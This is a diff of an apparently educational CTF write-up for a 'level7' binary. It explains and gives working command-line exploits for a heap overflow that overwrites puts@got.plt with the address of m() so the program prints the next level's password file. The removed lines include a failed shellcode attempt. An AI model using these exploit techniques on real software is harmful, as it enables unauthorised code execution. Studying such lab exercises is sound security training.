@@ -1,60 +1,13 @@
 
+heap:			0x804a008
+addr m(): 		0x080484f4
+addr puts@got.plt:	0x08049928 
 
+=> The buffers are adjacent
+=> The first strcpy allows us to overwrite the address of buff2 in buff3 with the address of puts@got.plt
+=> So buff3[1] = addr puts@got.plt
+=> Then the second strcpy will write from buff3[1] (puts@got.plt) and write the address of m() function
+=> When the puts() function will be called the m() function will be executed and print c (the flag)
 
-/****************************/
-/*	Ghidra decompiler   */
-/****************************/
-main:
-  undefined4 *puVar1;
-  void *pvVar2;
-  undefined4 *puVar3;
-  FILE *__stream;
-  
-  puVar1 = (undefined4 *)malloc(8);
-  *puVar1 = 1;
-  pvVar2 = malloc(8);
-  puVar1[1] = pvVar2;
-  puVar3 = (undefined4 *)malloc(8);
-  *puVar3 = 2;
-  pvVar2 = malloc(8);
-  puVar3[1] = pvVar2;
-  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
-  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
-  __stream = fopen("/home/user/level8/.pass","r");
-  fgets(c,0x44,__stream);
-  puts("~~");
-  return 0;
-
-
-/****************************/
-/*	    Infos	    */
-/****************************/
-
-
-- need 2 arguments
-
-return du premier malloc eax = 0x804a008 (heap address)
-
-08049960 g     O .bss	00000050              c
-
-First argument segfault after:
-python -c 'print "A"*20' -> + 4 bytes equal one of the malloc address pVar[1]
-
-Second argument segfault after:
-python -c 'print "B"*71' -> next bytes touch free allocation table
-
-
-Tests:
-
-=> Try to overwrite return main -> not working :( F A I L E D 
-./level7 `python -c 'print "A"*20 + "\x4c\xf6\xff\xbf"'` `python -c 'print "\x50\xf6\xff\xbf" + "\x90"*100 + "\xCC"'`
-
-=> Find another way and remember previous notions -> overwrite format string and plt 
-=> Best way should be to overwrite puts
-=> Overwriting "~~" doesn't work -> F A I L
-=> Overwrite puts plt 
-=> Check available function m() -> print c
-=> Overwrite puts plt to m() address - W I N 
 ./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
-
 
